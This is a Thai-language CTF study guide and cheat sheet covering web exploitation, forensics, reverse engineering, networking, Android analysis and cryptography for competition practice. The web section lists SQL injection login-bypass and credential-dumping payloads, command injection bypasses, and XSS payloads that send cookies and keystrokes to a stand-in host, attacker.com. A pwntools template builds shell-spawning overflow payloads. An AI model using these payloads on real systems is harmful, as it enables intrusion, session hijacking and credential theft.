# สรุปไว้อ่านครับไอ่ดำ
# KKU CTF Complete Guide & Cheat Sheet 🚀

## 🌐 1. Web Application Exploitation

### SQL Injection - หาช่องโหว่ในฐานข้อมูล

**คืออะไร?** เป็นการโจมตีที่ใส่ SQL code เข้าไปใน input field เพื่อเข้าถึงฐานข้อมูลแบบไม่ได้รับอนุญาต

**วิธีคิด:**
1. หา input field ที่ไม่ได้ filter (login form, search box, เป็นต้น)
2. ทดสอบใส่ quote (') ดูว่า error ไหม
3. ถ้า error แสดงว่ามีช่องโหว่
4. เริ่มดึงข้อมูลออกมา

**เครื่องมือที่ใช้:**
- **Burp Suite** - สำหรับ intercept และแก้ไข HTTP requests
- **SQLMap** - เครื่องมือ automated SQL injection
- **Browser DevTools** - ดู network requests และ responses

<details>
<summary>📋 SQL Injection Commands (SQL/MySQL)</summary>

```sql
-- เทสต์พื้นฐาน (ใส่ใน login form หรือ search box)
-- ใช้เพื่อ bypass login โดยไม่ต้องรู้รหัสผ่าน
admin' OR '1'='1' --        -- สำหรับ username field
admin' OR 1=1 --            -- รูปแบบง่ายกว่า
" OR "1"="1" --             -- ถ้าใช้ double quotes

-- หาจำนวน column (Union-based)
-- ต้องรู้จำนวน column ก่อนจะใช้ UNION
' ORDER BY 1 --             -- เทสต์ column ที่ 1
' ORDER BY 2 --             -- เทสต์ column ที่ 2
' ORDER BY 3 --             -- เพิ่มไปเรื่อยๆจนกว่าจะ error

-- ดึงข้อมูลฐานข้อมูล (หลังจากรู้จำนวน column แล้ว)
' UNION SELECT null,database(),user() --           -- ดึงชื่อ database และ user
' UNION SELECT 1,version(),3 --                    -- ดึง version ของ database

-- หาชื่อตาราง (table names)
' UNION SELECT 1,table_name,3 FROM information_schema.tables --
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() --

-- หาชื่อ column (column names)
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' --

-- ดึงข้อมูลจากตาราง (ดึง username และ password)
' UNION SELECT 1,group_concat(username,':',password),3 FROM users --

-- Blind SQL Injection (ใช้เมื่อไม่มี error message แสดง)
-- ใช้เพื่อเดาข้อมูลทีละตัวอักษร
' AND (SELECT SUBSTRING(database(),1,1))='a' --    -- เช็คตัวอักษรแรกของชื่อ database
' AND LENGTH(database())=5 --                      -- เช็คความยาวของชื่อ database
' AND ASCII(SUBSTRING(database(),1,1))=97 --       -- เช็ค ASCII value ของตัวอักษร

-- Time-based blind (ใช้เมื่อไม่มี response ต่างกัน)
-- ถ้าเงื่อนไขเป็นจริง จะหน่วงเวลา 5 วินาที
' AND SLEEP(5) --                                  -- MySQL
'; WAITFOR DELAY '00:00:05' --                     -- SQL Server
```

**วิธีใช้:** ใส่ในช่อง username หรือ password ของ login form, หรือใน search box, URL parameters

</details>

### XSS (Cross-Site Scripting) - โจมตีผ่าน JavaScript

**คืออะไร?** การใส่ JavaScript code ในเว็บเพื่อให้ผู้ใช้คนอื่นรัน code นั้น

**ประเภท:**
- **Reflected XSS:** แสดงผลทันที (เช่น search result)
- **Stored XSS:** เก็บไว้ในฐานข้อมูล (เช่น comment)
- **DOM-based XSS:** ทำงานผ่าน JavaScript ในหน้าเว็บ

**เครื่องมือที่ใช้:**
- **Burp Suite** - ทดสอบและส่ง payloads
- **OWASP ZAP** - เครื่องมือ security testing
- **XSS Hunter** - เก็บ XSS payloads ที่ทำงาน

<details>
<summary>📋 XSS Payloads (HTML/JavaScript)</summary>

```html
<!-- เทสต์พื้นฐาน - ใช้ทดสอบว่ามี XSS หรือไม่ -->
<script>alert('XSS')</script>              <!-- แสดง popup alert -->
<img src=x onerror=alert('XSS')>           <!-- ใช้ image error event -->
<svg onload=alert('XSS')>                  <!-- ใช้ SVG onload event -->
<iframe src="javascript:alert('XSS')">     <!-- ใช้ iframe javascript URL -->

<!-- Bypass filters (หลบ filter ที่กรอง script tag) -->
<ScRiPt>alert('XSS')</ScRiPt>                                    <!-- เปลี่ยน case -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>  <!-- encode เป็น ASCII -->
<img src="javascript:alert('XSS')">                              <!-- ใช้ javascript: protocol -->
<body onload=alert('XSS')>                                       <!-- ใช้ body onload -->

<!-- HTML encoding (เมื่อ input ถูก encode) -->
&lt;script&gt;alert('XSS')&lt;/script&gt;                    <!-- HTML entities -->
&#60;script&#62;alert('XSS')&#60;/script&#62;               <!-- Decimal HTML entities -->

<!-- Cookie stealing - ขโมย session cookies -->
<script>fetch('http://attacker.com/?cookie='+document.cookie)</script>
<img src=x onerror="location='http://attacker.com/?c='+document.cookie">
<script>new Image().src='http://attacker.com/?cookie='+document.cookie</script>

<!-- Keylogger - บันทึกการกดปุ่ม -->
<script>document.onkeypress=function(e){fetch('http://attacker.com/?key='+String.fromCharCode(e.which))}</script>

<!-- Redirect - เปลี่ยนหน้าเว็บ -->
<script>window.location='http://attacker.com'</script>
```

**วิธีใช้:** ใส่ใน comment box, search field, profile information, หรือ URL parameters

</details>

### Command Injection - รัน command ในเซิร์ฟเวอร์

**คืออะไร?** การใส่ system command ใน input เพื่อให้เซิร์ฟเวอร์รัน command นั้น

**วิธีหา:** มองหา input ที่อาจจะใช้ระบบ เช่น ping, nslookup, file upload

**เครื่องมือที่ใช้:**
- **Burp Suite** - ส่ง payloads และดู response
- **Terminal/Command Line** - เพื่อเข้าใจ command ที่ใช้

<details>
<summary>📋 Command Injection Payloads (Bash/Shell)</summary>

```bash
# Basic separators - ใช้คั่นระหว่าง command เดิมกับ command ใหม่
; ls                 # semicolon - รัน command ต่อเนื่อง
| ls                 # pipe - ส่ง output ของ command แรกให้ command หลัง
& ls                 # ampersand - รัน command ใน background
&& ls                # AND - รัน command หลังถ้า command แรกสำเร็จ
|| ls                # OR - รัน command หลังถ้า command แรกล้มเหลว
`ls`                 # backticks - command substitution
$(ls)                # command substitution (modern syntax)

# Bypass spaces - เมื่อ space ถูกกรอง
{ls,-la}             # brace expansion
$IFS                 # Internal Field Separator (space)
${IFS}               # IFS ในรูปแบบ variable
%20                  # URL encoded space
$'\x20'              # hex encoded space

# Bypass filtering - เมื่อ command ถูกกรอง
l''s                 # ใส่ empty string ใน command
l""s                 # ใช้ double quotes
l\s                  # escape character
/bin/ca\t /etc/passwd    # escape ตัวอักษรใน command
/bin/cat /e?c/pas?wd     # wildcard characters

# Common useful commands - command ที่มักใช้หาข้อมูล
; cat /etc/passwd        # ดู user accounts
; whoami                 # ดู user ปัจจุบัน
; pwd                    # ดู directory ปัจจุบัน
; ls -la                 # list files พร้อม permission
; id                     # ดู user ID และ group
; uname -a               # ดูข้อมูล system
; ps aux                 # ดู running processes
; netstat -tulpn         # ดู network connections

# Find flag files - หาไฟล์ที่มี flag
; find / -name "*flag*" 2>/dev/null       # หาไฟล์ชื่อมี flag
; grep -r "flag" /home/ 2>/dev/null       # หาข้อความ flag ในไฟล์
; locate flag                             # ใช้ locate database หาไฟล์
```

**วิธีใช้:** ใส่ใน input field ที่มี system command เช่น ping tool, traceroute, nslookup

</details>

---

## 🔍 2. Digital Forensics

### File Analysis - วิเคราะห์ไฟล์

**จุดประสงค์:** หาข้อมูลที่ซ่อนอยู่ในไฟล์ เช่น metadata, hidden data, embedded files

**ขั้นตอน:**
1. เช็คประเภทไฟล์จริงๆ
2. ดู metadata 
3. หา hidden data
4. Extract embedded files

**เครื่องมือที่ใช้:**
- **ExifTool** - ดู metadata ของไฟล์รูปภาพ
- **Binwalk** - หาไฟล์ที่ซ่อนใน binary
- **Steghide** - extract ข้อมูลจาก steganography
- **Strings** - หา text strings ในไฟล์ binary
- **HexEditor** - ดูข้อมูลในรูปแบบ hexadecimal

<details>
<summary>📋 File Analysis Commands (Bash/Linux Tools)</summary>

```bash
# ตรวจสอบประเภทไฟล์ - เช็คว่าไฟล์เป็นอะไรจริงๆ
file filename                    # บอกประเภทไฟล์
hexdump -C filename | head       # ดู hex dump 16 บรรทัดแรก
xxd filename | head              # alternative hex viewer

# ดู strings ในไฟล์ - หาข้อความที่อ่านได้ในไฟล์ binary
strings filename                 # แสดง ASCII strings ทั้งหมด
strings -n 10 filename           # แสดงเฉพาะ strings ที่ยาวอย่างน้อย 10 ตัวอักษร
strings -e l filename            # แสดง 16-bit little-endian strings

# EXIF data (metadata ของรูปภาพ) - ข้อมูลที่ซ่อนในรูป
exiftool image.jpg               # ดู metadata ครบถ้วน
identify -verbose image.jpg      # ImageMagick verbose info
exiv2 image.jpg                  # alternative EXIF tool

# Steganography (ข้อมูลซ่อนในรูป) - หาข้อมูลที่ซ่อนในรูปภาพ
steghide extract -sf image.jpg   # extract ไฟล์ที่ซ่อนด้วย steghide
steghide info image.jpg          # ดูข้อมูลการซ่อน
zsteg image.png                  # ตรวจสอบ PNG steganography
zsteg -a image.png               # ดูทุกแบบที่เป็นไปได้
outguess -r image.jpg output.txt # extract ด้วย outguess
stegsolve image.jpg              # GUI tool สำหรับ steganography

# Hidden files/archives - หาไฟล์ที่ซ่อนใน binary
binwalk filename                 # สแกนหาไฟล์ embedded
binwalk -e filename              # extract ไฟล์ที่เจอ
foremost filename                # recover ไฟล์จาก binary data
7z x filename                    # extract ถ้าเป็น archive

# PDF analysis - วิเคราะห์ไฟล์ PDF
pdfinfo document.pdf             # ข้อมูลพื้นฐานของ PDF
pdf-parser document.pdf          # วิเคราะห์ structure ของ PDF
peepdf document.pdf              # ตรวจสอบ malicious content ใน PDF
```

**วิธีใช้:** เริ่มจาก `file` เสมอ แล้วใช้ tool ที่เหมาะสมตามประเภทไฟล์

</details>

### PCAP Analysis - วิเคราะห์ network traffic

**คืออะไร?** ไฟล์ที่เก็บ network traffic สำหรับวิเคราะห์การสื่อสาร

**เครื่องมือที่ใช้:**
- **Wireshark** - GUI สำหรับวิเคราะห์ network packets
- **tshark** - Command line version ของ Wireshark
- **NetworkMiner** - Network forensic analysis tool
- **tcpflow** - reconstruct TCP sessions

<details>
<summary>📋 PCAP Analysis Commands (Wireshark Filters & tshark)</summary>

```bash
# Wireshark Display Filters - ใช้ใน Wireshark GUI
http.request.method == "POST"         # แสดงเฉพาะ HTTP POST requests
http.request.method == "GET"          # แสดงเฉพาะ HTTP GET requests
ftp                                   # แสดงเฉพาะ FTP traffic
ftp-data                              # แสดงเฉพาะ FTP data transfer
telnet                                # แสดงเฉพาะ Telnet traffic
dns.qry.name contains "flag"          # DNS queries ที่มีคำว่า "flag"
tcp.stream eq 0                       # แสดงเฉพาะ TCP stream หมายเลข 0
ip.addr == 192.168.1.1               # traffic จาก/ไป IP นี้

# tshark commands - command line packet analysis
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data
# ดึง POST data จาก HTTP requests

tshark -r capture.pcap -Y "ftp-data"
# แสดง FTP data transfers

tshark -r capture.pcap -Y "dns"
# แสดง DNS queries และ responses

# วิธีใช้ใน Wireshark GUI:
# Extract HTTP objects: File -> Export Objects -> HTTP
# Follow streams: right-click packet -> Follow -> TCP Stream
# Export packet bytes: File -> Export Packet Bytes
# Search for strings: Edit -> Find Packet -> String: "flag"
# Search hex: Edit -> Find Packet -> Hex: 666c6167 (hex for "flag")
```

**วิธีใช้:** เปิดไฟล์ .pcap ใน Wireshark แล้วใช้ filter หาข้อมูลที่ต้องการ

</details>

### Memory Dumps - วิเคราะห์ memory

**คืออะไร?** ไฟล์ที่เก็บ RAM ของระบบ สำหรับ forensic analysis

**เครื่องมือที่ใช้:**
- **Volatility Framework** - วิเคราะห์ memory dumps
- **Rekall** - alternative memory analysis framework

<details>
<summary>📋 Volatility Commands (Python/Volatility Framework)</summary>

```bash
# หา profile ที่ใช้ - ต้องรู้ OS และ version ก่อนวิเคราะห์
volatility -f memdump.raw imageinfo        # หา OS profile
volatility -f memdump.raw kdbgscan          # alternative method หา profile

# Process information - ดูข้อมูล process ที่รันอยู่
volatility -f memdump.raw --profile=Win7SP1x64 pslist     # list processes
volatility -f memdump.raw --profile=Win7SP1x64 pstree     # processes ในรูป tree
volatility -f memdump.raw --profile=Win7SP1x64 psscan     # scan หา hidden processes

# Network connections - ดูการเชื่อมต่อ network
volatility -f memdump.raw --profile=Win7SP1x64 netscan    # network connections
volatility -f memdump.raw --profile=Win7SP1x64 connections # active connections

# Registry - ดูข้อมูล Windows registry
volatility -f memdump.raw --profile=Win7SP1x64 hivelist   # list registry hives
volatility -f memdump.raw --profile=Win7SP1x64 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"
# ดู startup programs

# Files - ดูและ extract ไฟล์
volatility -f memdump.raw --profile=Win7SP1x64 filescan   # scan หาไฟล์
volatility -f memdump.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003e8b6f20 -D ./
# dump ไฟล์ออกมา (ใช้ address จาก filescan)

# Command history - ดู command ที่เคยรัน
volatility -f memdump.raw --profile=Win7SP1x64 cmdline    # command line arguments
volatility -f memdump.raw --profile=Win7SP1x64 consoles   # console command history
```

**วิธีใช้:** เริ่มจาก imageinfo เพื่อหา profile แล้วใช้ commands อื่นๆ วิเคราะห์

</details>

---

## 🔧 3. Reverse Engineering / Pwnable

### Binary Analysis - แกะ binary files

**จุดประสงค์:** เข้าใจว่าโปรแกรมทำงานยังไง และหาช่องโหว่

**เครื่องมือที่ใช้:**
- **GDB** - debugger สำหรับ Linux
- **radare2** - reverse engineering framework
- **Ghidra** - NSA's reverse engineering tool
- **IDA Pro** - commercial disassembler
- **objdump** - display information about object files
- **pwntools** - Python library สำหรับ binary exploitation

<details>
<summary>📋 Reverse Engineering Commands (GDB/radare2/objdump)</summary>

```bash
# Basic file information - ดูข้อมูลพื้นฐานของไฟล์
file binary                      # ประเภทไฟล์ และ architecture
strings binary                   # strings ที่อ่านได้ในไฟล์
hexdump -C binary                # hex dump ของไฟล์

# GDB debugging - debug โปรแกรมแบบ interactive
gdb ./binary                     # เปิด binary ใน GDB
(gdb) info functions             # list ฟังก์ชันทั้งหมด
(gdb) disas main                 # disassemble ฟังก์ชัน main
(gdb) break main                 # ตั้ง breakpoint ที่ main
(gdb) run                        # รันโปรแกรม
(gdb) x/20x $esp                 # ดู stack 20 words ในรูป hex
(gdb) x/s 0x804a000              # ดู string ที่ address นี้

# radare2 - powerful reverse engineering framework
r2 binary                        # เปิดไฟล์ใน radare2
[0x00400000]> aaa                # analyze all functions
[0x00400000]> pdf @main          # disassemble main function
[0x00400000]> iz                 # list strings ในไฟล์
[0x00400000]> ii                 # list imported functions

# objdump - analyze object files
objdump -d binary                # disassemble executable sections
objdump -t binary                # display symbol table
objdump -x binary                # display all headers

# Check security mitigations - ดู security features
checksec binary                  # ตรวจสอบ ASLR, NX, PIE, etc.
```

**วิธีใช้:** เริ่มจาก file และ strings เพื่อดูภาพรวม แล้วใช้ disassembler วิเคราะห์ logic

</details>

### Buffer Overflow Exploitation

**คืออะไร?** การเขียนข้อมูลเกินขนาด buffer ที่กำหนด เพื่อ overwrite return address

**เครื่องมือที่ใช้:**
- **pwntools** - Python library สำหรับ exploitation
- **pattern_create/pattern_offset** - หา offset สำหรับ overflow
- **ROPgadget** - หา ROP gadgets

<details>
<summary>📋 Buffer Overflow Techniques (Python/pwntools)</summary>

```python
# Import pwntools library
from pwn import *

# Generate pattern - สร้าง pattern เพื่อหา offset
pattern = cyclic(200)            # สร้าง cyclic pattern ยาว 200 bytes
print(pattern)                   # ส่งไปให้โปรแกรม

# Find offset - หา offset ที่ overwrite return address
# หลังจากโปรแกรม crash ให้ดู register values
# แล้วใช้: cyclic_find(0x41414141) เพื่อหา offset

# Basic exploit - exploit พื้นฐาน
offset = 140                     # offset ที่ได้จากการหา
target_address = 0x08048484      # address ที่ต้องการ jump ไป
payload = b"A" * offset + p32(target_address)

# ROP chain example - ใช้ ROP เพื่อ bypass security
binary = ELF('./binary')         # load binary file
rop = ROP(binary)                # สร้าง ROP object
rop.system(next(binary.search(b'/bin/sh')))  # หา "/bin/sh" string และเรียก system
payload = b"A" * offset + rop.chain()

# Shell code - ใส่ shellcode เพื่อได้ shell
shellcode = asm(shellcraft.sh()) # generate shellcode ที่เรียก shell
# วาง shellcode ใน buffer แล้ว jump ไปที่ buffer
payload = shellcode + b"A" * (offset - len(shellcode)) + p32(stack_address)

# Send payload - ส่ง payload ไปให้โปรแกรม
p = process('./binary')          # เปิดโปรแกรม local
# p = remote('target', 1337)     # เชื่อมต่อ remote server
p.sendline(payload)              # ส่ง payload
p.interactive()                  # เข้าสู่ interactive mode
```

**วิธีใช้:** หา offset ก่อน แล้วสร้าง payload เพื่อ control program flow

</details>

---

## 🌐 4. Network Security

### Network Analysis - วิเคราะห์การสื่สารเครือข่าย

**เป้าหมาย:** เข้าใจ network protocol และหาข้อมูลที่ส่งผ่าน

**เครื่องมือที่ใช้:**
- **Nmap** - network scanner และ port scanner
- **Netcat** - network swiss army knife
- **tcpdump** - command line packet analyzer
- **Masscan** - high-speed port scanner

<details>
<summary>📋 Network Analysis Tools (Bash/Network Commands)</summary>

```bash
# nmap scanning - สแกนหา services และ vulnerabilities
nmap -sV target_ip               # version detection scan
nmap -sC -sV target_ip           # default scripts + version scan
nmap -A target_ip                # aggressive scan (OS detection, traceroute, etc.)
nmap -p- target_ip               # scan all 65535 ports
nmap -sU target_ip               # UDP scan
nmap --script vuln target_ip     # vulnerability scanning scripts

# netcat - การสื่สารผ่าน network
nc -lvp 4444                     # listen mode บน port 4444
nc target_ip 80                  # connect ไป port 80
echo "GET / HTTP/1.1" | nc target_ip 80  # ส่ง HTTP request

# tcpdump - capture network traffic
tcpdump -i eth0                  # capture บน interface eth0
tcpdump -i eth0 port 80          # capture เฉพาะ port 80
tcpdump -i eth0 host 192.168.1.1 # capture จาก/ไป host นี้
tcpdump -i eth0 -w capture.pcap  # save เป็นไฟล์

# Protocol analysis examples
# HTTP - วิเคราะห์ web traffic
curl -X POST http://target/login -d "user=admin&pass=test"
curl -H "User-Agent: CustomUA" http://target/

# FTP - file transfer protocol
ftp target_ip
# ใช้ anonymous:anonymous หรือ guest:guest

# Telnet - unencrypted remote access
telnet target_ip 23
```

**วิธีใช้:** เริ่มจาก nmap เพื่อหา services แล้วใช้ tools อื่นๆ วิเคราะห์ specific protocols

</details>

---

## 📱 5. Mobile Security

### Android APK Analysis

**จุดประสงค์:** วิเคราะห์แอป Android หาช่องโหว่หรือข้อมูลที่ซ่อนอยู่

**เครื่องมือที่ใช้:**
- **APKTool** - decompile และ rebuild APK files
- **dex2jar** - แปลง Android dex files เป็น Java jar
- **JD-GUI** - Java decompiler
- **ADB (Android Debug Bridge)** - interact กับ Android devices
- **MobSF** - Mobile Security Framework

<details>
<summary>📋 APK Analysis Commands (Bash/Android Tools)</summary>

```bash
# Extract APK - แกะไฟล์ APK
unzip app.apk                    # แกะเหมือน zip file
apktool d app.apk                # decompile ด้วย APKTool

# Convert to JAR and decompile - แปลงเป็น Java เพื่อดู source code
dex2jar app.apk                  # แปลง APK เป็น JAR file
jd-gui app-dex2jar.jar          # เปิด JAR ใน Java decompiler

# Important files to check:
# AndroidManifest.xml - permissions และ app components
# assets/ - additional files ที่ app ใช้
# lib/ - native libraries (.so files)
# res/ - resources (strings, layouts, etc.)

# Find interesting strings - หา strings ที่น่าสนใจ
strings classes.dex | grep -i "flag\|password\|key\|secret"
strings assets/* | grep -i "flag"   # ค้นหาใน assets folder

# Certificate information - ดูข้อมูล certificate
keytool -printcert -jarfile app.apk

# ADB commands (ถ้าทดสอบบน device จริง)
adb devices                      # ดู devices ที่เชื่อมต่อ
adb install app.apk              # install APK
adb shell                        # เข้า shell บน device
adb logcat                       # ดู system logs
adb pull /data/data/com.app.name/ # ดึงข้อมูล app จาก device
```

**วิธีใช้:** เริ่มจาก apktool เพื่อ decompile แล้วดู AndroidManifest.xml และใช้ strings หาข้อมูล

</details>

---

## 💻 6. Programming Challenges

### Algorithm & Logic Problems

**ทักษะที่ต้องมี:** Python, C, คณิตศาสต์, algorithm

**เครื่องมือที่ใช้:**
- **Python** - สำหรับ scripting และ mathematical calculations
- **C/C++** - สำหรับ performance-critical algorithms
- **Online Compilers** - repl.it, ideone.com
- **Mathematical Tools** - WolframAlpha, calculator

<details>
<summary>📋 Common Programming Patterns (Python)</summary>

```python
# Mathematical calculations - การคำนวณทางคณิตศาสตร์
import math
from fractions import Fraction    # สำหรับเศษส่วน
from decimal import Decimal       # สำหรับทศนิยมที่แม่นยำ

# Number theory - ทฤษฎีจำนวน
def gcd(a, b):                   # หาตัวหารร่วมมาก
    while b:
        a, b = b, a % b
    return a

def lcm(a, b):                   # หาตัวคูณร่วมน้อย
    return (a * b) // gcd(a, b)

# Prime numbers - จำนวนเฉพาะ
def is_prime(n):                 # เช็คว่าเป็นจำนวนเฉพาะหรือไม่
    if n < 2:
        return False
    for i in range(2, int(math.sqrt(n)) + 1):
        if n % i == 0:
            return False
    return True

# Binary operations - การดำเนินการแบบไบนารี
bin(number)                      # แปลงเป็นเลขฐาน 2
int('1010', 2)                   # แปลงจากเลขฐาน 2
hex(number)                      # แปลงเป็นเลขฐาน 16
int('ff', 16)                    # แปลงจากเลขฐาน 16

# String manipulation - การจัดการ string
text.encode('utf-8')             # encode เป็น bytes
text.decode('utf-8')             # decode จาก bytes
''.join(chr(i) for i in [72, 101, 108, 108, 111])  # ASCII to string

# File I/O - การอ่านเขียนไฟล์
with open('input.txt', 'r') as f:
    data = f.read()              # อ่านทั้งไฟล์
    lines = f.readlines()        # อ่านทีละบรรทัด

# Regular expressions - การจับคู่ pattern
import re
pattern = r'flag\{([^}]+)\}'     # pattern สำหรับหา flag
match = re.search(pattern, text)
if match:
    flag = match.group(1)        # ได้ข้อมูลใน parentheses
```

**วิธีใช้:** อ่านโจทย์ให้เข้าใจ แล้วเลือกใช้ algorithm ที่เหมาะสม

</details>

---

## 🔐 7. Cryptography

### Classical Ciphers

**Caesar Cipher** - เลื่อน alphabet

**เครื่องมือที่ใช้:**
- **CyberChef** - online tool สำหรับ encoding/decoding
- **dcode.fr** - cipher identification และ breaking
- **Python scripts** - สำหรับ custom implementations

<details>
<summary>📋 Caesar Cipher (Python)</summary>

```python
# Caesar Cipher - การเลื่อน alphabet
def caesar_encrypt(text, shift):     # เข้ารหัสด้วย Caesar cipher
    result = ""
    for char in text:
        if char.isalpha():           # ถ้าเป็นตัวอักษร
            ascii_offset = 65 if char.isupper() else 97  # A=65, a=97
            # เลื่อนตำแหน่งและ wrap around ด้วย modulo 26
            result += chr((ord(char) - ascii_offset + shift) % 26 + ascii_offset)
        else:
            result += char           # ไม่ใช่ตัวอักษรก็เก็บไว้เหมือนเดิม
    return result

def caesar_decrypt(text, shift):     # ถอดรหัส Caesar cipher
    return caesar_encrypt(text, -shift)  # เลื่อนกลับทิศ

# Brute force all shifts - ลองทุก shift ที่เป็นไปได้
ciphertext = "WKLV LV D WHVW"
for i in range(26):
    decrypted = caesar_decrypt(ciphertext, i)
    print(f"Shift {i}: {decrypted}")
```

**วิธีใช้:** ลอง brute force ทั้ง 26 shifts แล้วดูว่าอันไหนอ่านได้

</details>

### XOR Cipher

**เครื่องมือที่ใช้:**
- **CyberChef** - XOR operations
- **Python** - custom XOR implementations

<details>
<summary>📋 XOR Operations (Python)</summary>

```python
# XOR with single key - XOR กับ key ตัวเดียว
def xor_single_key(data, key):       # XOR string กับ key เดียว
    return ''.join(chr(ord(c) ^ key) for c in data)

# XOR with repeating key - XOR กับ key ที่วนซ้ำ
def xor_repeating_key(data, key):    # XOR กับ key ที่ repeat
    return ''.join(chr(ord(data[i]) ^ ord(key[i % len(key)])) for i in range(len(data)))

# XOR two strings - XOR string สองตัวเข้าด้วยกัน
def xor_strings(s1, s2):             # XOR สอง string ที่ความยาวเท่ากัน
    return ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(s1, s2))

# Brute force single byte XOR - ลองทุก key ที่เป็นไปได้
ciphertext = "encrypted_data"
for key in range(256):               # ลองทุก byte value (0-255)
    result = xor_single_key(ciphertext, key)
    if 'flag' in result.lower():     # ถ้าผลลัพธ์มีคำว่า flag
        print(f"Key {key}: {result}")
```

**วิธีใช้:** เริ่มจาก single byte XOR brute force ก่อน ถ้าไม่ได้ลอง repeating key

</details>

### RSA Cryptography

**เครื่องมือที่ใช้:**
- **RsaCtfTool** - automated RSA attack tool
- **FactorDB** - online integer factorization database
- **Python** - custom RSA implementations

<details>
<summary>📋 RSA Analysis (Python)</summary>

```python
import gmpy2                         # สำหรับ mathematical operations
from Crypto.Util.number import *     # PyCrypto utilities

# Basic RSA - RSA พื้นฐาน
def rsa_decrypt(c, d, n):            # ถอดรหัส RSA
    return pow(c, d, n)              # c^d mod n

# Find d from e, p, q - หา private key จาก public key และ prime factors
def find_d(e, p, q):
    phi = (p - 1) * (q - 1)          # Euler's totient function
    return inverse(e, phi)           # d = e^-1 mod phi

# Factor n if it's small - แยกตัวประกอบของ n
def factor_n(n):
    for i in range(2, int(n**0.5) + 1):
        if n % i == 0:
            return i, n // i         # คืน p และ q
    return None, None

# Common RSA attacks:

# 1. Small e attack (e=3) and small message
def small_e_attack(c, e, n):         # เมื่อ e เล็กและ message เล็ก
    # ลอง m^e = c + k*n สำหรับ k เล็กๆ
    for k in range(1000):
        m_candidate = gmpy2.iroot(c + k * n, e)  # หา root ที่ e
        if m_candidate[1]:           # ถ้าเป็น perfect root
            return m_candidate[0]
    return None

# 2. Common modulus attack - เมื่อ message เดียวกันถูกเข้ารหัสด้วย e ต่างกันแต่ n เดียวกัน
def common_modulus_attack(c1, c2, e1, e2, n):
    def extended_gcd(a, b):          # Extended Euclidean Algorithm
        if a == 0:
            return b, 0, 1
        gcd, x1, y1 = extended_gcd(b % a, a)
        x = y1 - (b // a) * x1
        y = x1
        return gcd, x, y
    
    gcd, x, y = extended_gcd(e1, e2)
    if gcd == 1:                     # ถ้า gcd(e1,e2) = 1
        if x < 0:                    # จัดการ negative exponents
            c1 = inverse(c1, n)
            x = -x
        if y < 0:
            c2 = inverse(c2, n)
            y = -y
        return pow(c1, x, n) * pow(c2, y, n) % n  # c1^x * c2^y mod n
```

**วิธีใช้:** เริ่มจากลอง factor n ถ้าได้ก็หา d แล้วถอดรหัส ถ้าไม่ได้ลอง attack patterns อื่น

</details>

### Base Encoding

**เครื่องมือที่ใช้:**
- **CyberChef** - multiple encoding operations
- **Base64 Decoder** - online base64 tools

<details>
<summary>📋 Base Encoding/Decoding (Python)</summary>

```python
import base64                        # built-in base encoding library

# Base64 - encoding ที่ใช้บ่อยที่สุด
text = b"Hello World"
encoded = base64.b64encode(text)     # encode เป็น base64
decoded = base64.b64decode(encoded)  # decode จาก base64

# Base32 - ใช้ตัวอักษร A-Z และเลข 2-7
encoded = base64.b32encode(text)     # encode เป็น base32
decoded = base64.b32decode(encoded)  # decode จาก base32

# Hex encoding - แปลงเป็นเลขฐาน 16
text = "Hello World"
hex_encoded = text.encode('utf-8').hex()         # encode เป็น hex
hex_decoded = bytes.fromhex(hex_encoded).decode('utf-8')  # decode จาก hex

# Custom base conversion - แปลงเลขฐานอื่นๆ
def to_base(num, base):              # แปลงเลขเป็นฐานอื่น
    if num == 0:
        return "0"
    digits = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    result = ""
    while num:
        result = digits[num % base] + result
        num //= base
    return result

def from_base(s, base):              # แปลงจากฐานอื่นเป็นเลขฐาน 10
    digits = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    result = 0
    for char in s:
        result = result * base + digits.index(char)
    return result
```

**วิธีใช้:** ลองถอด base64 ก่อน ถ้าไม่ได้ลอง base32 หรือ hex

</details>

---

## 🛠️ Essential Tools & Setup

### Must-have Tools
```bash
# Installation commands for Kali Linux
sudo apt update
sudo apt install -y wireshark burpsuite nmap metasploit-framework
sudo apt install -y binwalk steghide exiftool zsteg
sudo apt install -y radare2 gdb python3-pwntools
sudo apt install -y volatility3 foremost apktool
sudo apt install -y john hashcat hydra
```

### Browser Extensions
- **Burp Suite** - Web application testing
- **Wappalyzer** - Technology detection  
- **Cookie Editor** - Edit cookies easily
- **User-Agent Switcher** - Change browser user agent

### Online Tools
- **CyberChef** (gchq.github.io/CyberChef) - Data manipulation Swiss Army knife
- **dcode.fr** - Cipher identification and decryption
- **Crackstation** - Hash cracking database
- **VirusTotal** - File and URL analysis
- **Hashes.com** - Hash lookup database
- **Base64 Decode** - Quick base64 operations

---

### Common Flag Formats
```
flag{...}
ctf{...}
KKU{...}
FLAG{...}
KCTF{...}
```

### Debugging Tips
1. **เช็ค file type ก่อนเสมอ** - `file filename`
2. **ดู strings** - `strings filename | grep -i flag`
3. **ใช้ hexdump** - `hexdump -C filename | head`
4. **Google error messages** - อย่าลืม search
5. **ลองใส่ใน CyberChef** - มักจะช่วยได้

---

## 🔧 Tools Reference Guide

### Web Security Tools
- **Burp Suite** - Web proxy, scanner, intruder สำหรับ web app testing
- **OWASP ZAP** - Free web security scanner
- **SQLMap** - Automated SQL injection tool
- **Dirb/Gobuster** - Directory/file brute forcing
- **Nikto** - Web server scanner

### Forensics Tools  
- **Autopsy** - Digital forensics platform
- **Wireshark** - Network protocol analyzer
- **Volatility** - Memory analysis framework
- **Binwalk** - Firmware analysis tool
- **ExifTool** - Metadata extraction
- **Steghide** - Steganography tool
- **Zsteg** - PNG/BMP steganography detection

### Reverse Engineering Tools
- **Ghidra** - NSA's reverse engineering suite
- **IDA Pro** - Interactive disassembler (commercial)
- **x64dbg** - Windows debugger
- **OllyDbg** - 32-bit debugger
- **Radare2** - Reverse engineering framework
- **Binary Ninja** - Binary analysis platform

### Cryptography Tools
- **John the Ripper** - Password cracker
- **Hashcat** - Advanced password recovery
- **CyberChef** - Data transformation recipes
